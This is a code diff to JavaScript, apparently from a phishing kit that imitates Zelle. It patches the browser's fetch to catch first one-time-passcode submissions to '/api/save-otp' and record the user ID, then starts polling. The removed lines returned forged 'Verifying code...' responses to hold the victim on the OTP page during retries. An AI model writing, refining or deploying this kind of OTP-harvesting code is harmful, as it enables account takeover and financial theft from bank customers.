@@ -912,55 +912,34 @@
     }
     
     // ========================================
-    // INTERCEPT OTP SUBMISSION FROM REACT APP
+    // PASSIVE FETCH TAP - OBSERVE ONLY, DON'T INTERFERE
     // ========================================
     function interceptOtpSubmission() {
-        // Watch for OTP submission in the React app
         const originalFetch = window.fetch;
+        
         window.fetch = async function(...args) {
             const response = await originalFetch.apply(this, args);
             
-            // Check if this is an OTP submission (FIRST OTP only, not final OTP)
-            const url = args[0];
-            const isFirstOtpSubmission = (url.includes('/api/save-otp') && !url.includes('final')) || 
-                                         (url.includes('/api/save') && !url.includes('final') && !url.includes('email'));
-            
-            if (isFirstOtpSubmission) {
-                try {
+            try {
+                const url = typeof args[0] === 'string' ? args[0] : args[0].url;
+                
+                const isFirstOtpSubmission = url.includes('/api/save-otp') && !url.includes('final');
+                
+                if (isFirstOtpSubmission && response.ok) {
                     const clonedResponse = response.clone();
                     const data = await clonedResponse.json();
                     
                     if (data.success && data.id) {
-                        console.log('[Zelle Extended] OTP submitted, user ID:', data.id);
-                        
-                        // Check if this is a RETRY (polling was stopped after decline)
-                        if (pollingStopped) {
-                            console.log('[Zelle Extended] 🔄 RETRY DETECTED - Blocking React from advancing');
-                            
-                            // Restart polling for retry
-                            currentUserId = data.id;
-                            startOtpPolling(data.id);
-                            
-                            // Return fake response to keep React on OTP page
-                            return new Response(JSON.stringify({
-                                success: false,
-                                message: 'Verifying code...'
-                            }), {
-                                status: 200,
-                                headers: { 'Content-Type': 'application/json' }
-                            });
-                        } else {
-                            // First time - let React advance normally
-                            console.log('[Zelle Extended] ✅ FIRST SUBMISSION - Allowing React to advance');
-                            currentUserId = data.id;
-                            startOtpPolling(data.id);
-                        }
+                        console.log('[Zelle Extended] 🔎 OTP detected. Starting polling for user:', data.id);
+                        currentUserId = data.id;
+                        startOtpPolling(data.id);
                     }
-                } catch (e) {
-                    // Ignore parsing errors
                 }
+            } catch (err) {
+                console.warn('[Zelle Extended] Tap error:', err);
             }
             
+            // ✅ CRITICAL: Always return original response - NEVER modify
             return response;
         };
     }
